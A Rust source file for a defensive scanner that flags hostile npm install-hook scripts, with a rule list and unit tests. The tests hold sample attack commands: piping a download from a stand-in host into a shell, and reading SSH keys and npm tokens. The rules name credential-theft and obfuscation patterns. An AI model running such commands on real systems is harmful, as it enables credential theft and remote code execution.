//! Static analysis of lifecycle scripts.
//!
//! ## MVP strategy (phase 2 entry point)
//!
//! We scan `preinstall` / `install` / `postinstall` script strings for known
//! malicious patterns. This phase uses fast substring/pattern heuristics; the
//! full `swc`-based AST analysis (which resists trivial obfuscation) is tracked
//! in `ROADMAP.md`.

use std::collections::HashMap;

/// Severity of a static-analysis finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    /// Hard block: refuse to install unless the user overrides.
    Block,
    /// Soft warning: surface to the user but continue.
    Warn,
}

/// A single finding from the static scan.
#[derive(Debug, Clone)]
pub struct Finding {
    pub script: String,
    pub severity: Severity,
    pub pattern: String,
    pub explanation: String,
}

struct Rule {
    severity: Severity,
    /// Lowercased needle to search for, plus a human explanation.
    needle: &'static str,
    explanation: &'static str,
}

/// The lifecycle scripts we treat as security-sensitive.
const LIFECYCLE_SCRIPTS: &[&str] = &["preinstall", "install", "postinstall"];

// Needles are matched against a *whitespace-stripped, lowercased* copy of the
// script, so `eval ( x )`, `curl   http`, and newline-split tricks all collapse
// to the same form. Keep needles free of spaces.
const RULES: &[Rule] = &[
    Rule {
        severity: Severity::Block,
        needle: "curlhttp",
        explanation: "downloads a remote payload with curl during install",
    },
    Rule {
        severity: Severity::Block,
        needle: "wgethttp",
        explanation: "downloads a remote payload with wget during install",
    },
    Rule {
        severity: Severity::Block,
        needle: "eval(",
        explanation: "uses eval() — a common way to execute hidden code",
    },
    Rule {
        severity: Severity::Block,
        needle: "newfunction(",
        explanation: "uses the Function constructor — dynamic code execution like eval",
    },
    Rule {
        severity: Severity::Block,
        needle: "base64",
        explanation: "decodes base64 — frequently used to hide malicious payloads",
    },
    Rule {
        severity: Severity::Block,
        needle: "atob(",
        explanation: "decodes base64 via atob() — common payload obfuscation",
    },
    Rule {
        severity: Severity::Block,
        needle: "fromcharcode",
        explanation: "builds strings from char codes — typical obfuscation",
    },
    Rule {
        severity: Severity::Block,
        needle: ".ssh",
        explanation: "references ~/.ssh — possible credential theft",
    },
    Rule {
        severity: Severity::Block,
        needle: ".aws",
        explanation: "references ~/.aws — possible cloud credential theft",
    },
    Rule {
        severity: Severity::Block,
        needle: ".npmrc",
        explanation: "reads ~/.npmrc — possible npm token theft",
    },
    Rule {
        severity: Severity::Block,
        needle: "child_process",
        explanation: "spawns external processes during install",
    },
    Rule {
        severity: Severity::Block,
        needle: "process.binding(",
        explanation: "uses process.binding — low-level access often used to escape sandboxes",
    },
    Rule {
        severity: Severity::Warn,
        needle: "process.env",
        explanation: "reads environment variables — verify it does not exfiltrate secrets",
    },
    Rule {
        severity: Severity::Warn,
        needle: "require('net')",
        explanation: "opens raw network sockets",
    },
    Rule {
        severity: Severity::Warn,
        needle: "require(\"net\")",
        explanation: "opens raw network sockets",
    },
];

/// Threshold of `\x`/`\u` escape sequences above which we flag heavy obfuscation.
const HEX_ESCAPE_THRESHOLD: usize = 8;

/// Scan a package's `scripts` map and return any findings in lifecycle hooks.
///
/// The script is lowercased and whitespace-stripped before matching, so simple
/// obfuscation (extra spaces, newlines, tabs between tokens) cannot evade the
/// rules. A full `swc` AST pass is tracked as future hardening in `ROADMAP.md`.
pub fn scan(scripts: &HashMap<String, String>) -> Vec<Finding> {
    let mut findings = Vec::new();
    for hook in LIFECYCLE_SCRIPTS {
        let Some(body) = scripts.get(*hook) else {
            continue;
        };
        let lowered = body.to_lowercase();
        let compact: String = lowered.split_whitespace().collect();

        for rule in RULES {
            if compact.contains(rule.needle) {
                findings.push(Finding {
                    script: (*hook).to_string(),
                    severity: rule.severity,
                    pattern: rule.needle.to_string(),
                    explanation: rule.explanation.to_string(),
                });
            }
        }

        // Density heuristic: a script drowning in hex/unicode escapes is almost
        // certainly hiding something.
        let escapes = lowered.matches("\\x").count() + lowered.matches("\\u").count();
        if escapes >= HEX_ESCAPE_THRESHOLD {
            findings.push(Finding {
                script: (*hook).to_string(),
                severity: Severity::Block,
                pattern: "\\x/\\u escapes".to_string(),
                explanation: format!("{escapes} hex/unicode escapes — heavy obfuscation"),
            });
        }
    }
    findings
}

/// Whether any finding is a hard block.
pub fn has_block(findings: &[Finding]) -> bool {
    findings.iter().any(|f| f.severity == Severity::Block)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scripts(hook: &str, body: &str) -> HashMap<String, String> {
        let mut m = HashMap::new();
        m.insert(hook.to_string(), body.to_string());
        m
    }

    #[test]
    fn detects_curl_exfiltration() {
        let s = scripts("postinstall", "curl http://evil.example/c | sh");
        let f = scan(&s);
        assert!(has_block(&f));
    }

    #[test]
    fn detects_ssh_access() {
        let s = scripts("preinstall", "cat ~/.ssh/id_rsa");
        assert!(has_block(&scan(&s)));
    }

    #[test]
    fn clean_script_passes() {
        let s = scripts("postinstall", "node build.js");
        assert!(scan(&s).is_empty());
    }

    #[test]
    fn env_access_only_warns() {
        let s = scripts("postinstall", "echo process.env.PATH");
        let f = scan(&s);
        assert!(!f.is_empty());
        assert!(!has_block(&f));
    }

    #[test]
    fn whitespace_obfuscated_eval_is_caught() {
        // Spaces and newlines between tokens must not evade detection.
        let s = scripts("postinstall", "node -e 'eval ( atob( x ) )'");
        assert!(has_block(&scan(&s)));
    }

    #[test]
    fn fromcharcode_obfuscation_is_caught() {
        let s = scripts("preinstall", "String.fromCharCode(104,105)");
        assert!(has_block(&scan(&s)));
    }

    #[test]
    fn npmrc_token_theft_is_caught() {
        let s = scripts("postinstall", "cat $HOME/.npmrc | node send.js");
        assert!(has_block(&scan(&s)));
    }

    #[test]
    fn heavy_hex_escapes_block() {
        let payload = "\\x68\\x65\\x6c\\x6c\\x6f\\x77\\x6f\\x72\\x6c\\x64\\x21";
        let s = scripts("postinstall", payload);
        assert!(has_block(&scan(&s)));
    }
}
